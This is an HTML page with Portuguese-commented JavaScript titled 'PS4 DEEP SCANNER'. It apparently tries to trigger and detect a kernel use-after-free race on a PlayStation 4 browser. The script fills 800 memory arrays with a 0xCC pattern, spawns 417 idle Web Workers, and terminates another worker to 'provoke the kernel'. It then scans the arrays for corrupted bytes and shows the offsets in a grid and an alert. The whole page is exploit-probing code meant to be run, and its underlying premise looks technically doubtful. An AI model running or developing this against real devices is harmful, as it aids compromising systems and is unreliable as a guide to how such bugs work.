<!DOCTYPE html>
<html lang="pt-PT">
<head>
    <meta charset="UTF-8">
    <title>PS4 DEEP SCANNER</title>
    <style>
        body { background-color: #000; color: #fff; font-family: monospace; text-align: center; padding: 20px; }
        #status { font-size: 1.5em; border: 1px solid #555; padding: 20px; margin: 20px 0; background: #111; }
        #matrix { display: grid; grid-template-columns: repeat(16, 1fr); gap: 2px; max-width: 800px; margin: 0 auto; font-size: 0.8em; display: none; }
        .cell { padding: 5px; background: #222; }
        .changed { background: #f00 !important; font-weight: bold; color: #fff; border: 2px solid #fff; }
        .safe { color: #555; }
    </style>
</head>
<body>

    <h1>DEEP MEMORY SCANNER</h1>
    <div id="status">A preparar...</div>
    <div id="matrix"></div>

    <script>
        // CONFIGURAÇÃO
        const TARGET_THREADS = 417; 
        const STRUCT_SIZE = 512;
        const FILL_BYTE = 0xCC; // Padrão de fundo (204)

        let workers = [];
        let sensorArrays = []; // Arrays sensores
        
        const blob = new Blob(["setInterval(()=>{}, 100000)"], {type:'text/javascript'});
        const url = URL.createObjectURL(blob);
        const killerBlob = new Blob(["self.close()"], {type:'text/javascript'});
        const killerUrl = URL.createObjectURL(killerBlob);

        function start() {
            document.getElementById('status').innerText = "1. ALOCANDO SENSORES...";
            
            // Cria arrays sensores preenchidos com 0xCC
            // Usamos Uint8Array para precisão byte-a-byte
            try {
                for(let i=0; i<800; i++) {
                    let ab = new ArrayBuffer(STRUCT_SIZE);
                    let arr = new Uint8Array(ab);
                    arr.fill(FILL_BYTE);
                    
                    // Marcação de segurança no início (para não confundir com outros objetos)
                    arr[0] = 0xAA; 
                    arr[1] = 0xBB;
                    
                    sensorArrays.push(arr);
                }
            } catch(e) {
                document.getElementById('status').innerText = "ERRO MEMÓRIA. REINICIE.";
                return;
            }

            document.getElementById('status').innerText = "2. CRIANDO THREADS...";
            createThreads();
        }

        function createThreads() {
            let i = setInterval(() => {
                if (workers.length < TARGET_THREADS) {
                    workers.push(new Worker(url));
                    if(workers.length % 50 === 0) document.getElementById('status').innerText = `THREADS: ${workers.length}...`;
                } else {
                    clearInterval(i);
                    document.getElementById('status').innerText = "3. PROVOCANDO O KERNEL...";
                    setTimeout(triggerUAF, 1000);
                }
            }, 30);
        }

        function triggerUAF() {
            // Mata thread e espera que o Kernel escreva nos nossos sensores
            const w = new Worker(killerUrl);
            w.terminate();
            
            // Espera um momento para o Kernel reagir (Race Condition)
            setTimeout(scanSensors, 500);
        }

        function scanSensors() {
            document.getElementById('status').innerText = "4. ANALISANDO DANOS...";
            
            let anomalies = [];
            
            for(let i=0; i<sensorArrays.length; i++) {
                const arr = sensorArrays[i];
                
                // Verifica a marcação (se sumiu, o objeto foi totalmente sobrescrito)
                if(arr[0] !== 0xAA || arr[1] !== 0xBB) {
                    // Ignora, provavelmente foi reciclado pelo navegador
                    continue; 
                }

                // Verifica byte a byte
                for(let k=2; k<STRUCT_SIZE; k++) {
                    if(arr[k] !== FILL_BYTE) {
                        anomalies.push({offset: k, val: arr[k]});
                    }
                }
                
                if(anomalies.length > 0) {
                    report(anomalies);
                    return;
                }
            }
            
            document.getElementById('status').innerText = "NADA DETECTADO. TENTE RECARREGAR (F5).";
        }

        function report(anomalies) {
            document.getElementById('status').innerText = "ALTERAÇÃO DETECTADA!!";
            document.getElementById('status').style.background = "#050";
            
            const m = document.getElementById('matrix');
            m.style.display = 'grid';
            
            // Mostra onde mudou
            let html = "";
            let changesText = "OFFSETS ALTERADOS:\n";
            
            // Mapeia os primeiros 512 bytes visualmente
            for(let i=0; i<STRUCT_SIZE; i++) {
                let changed = anomalies.find(a => a.offset === i);
                if(changed) {
                    html += `<div class="cell changed">${changed.val.toString(16).padStart(2,'0')}</div>`;
                    changesText += `Offset ${i}: 0x${changed.val.toString(16)}\n`;
                } else {
                    html += `<div class="cell safe">..</div>`;
                }
            }
            m.innerHTML = html;
            
            console.log(changesText);
            alert(changesText); // Popup para chamar atenção
        }

        setTimeout(start, 500);

    </script>
</body>
</html>
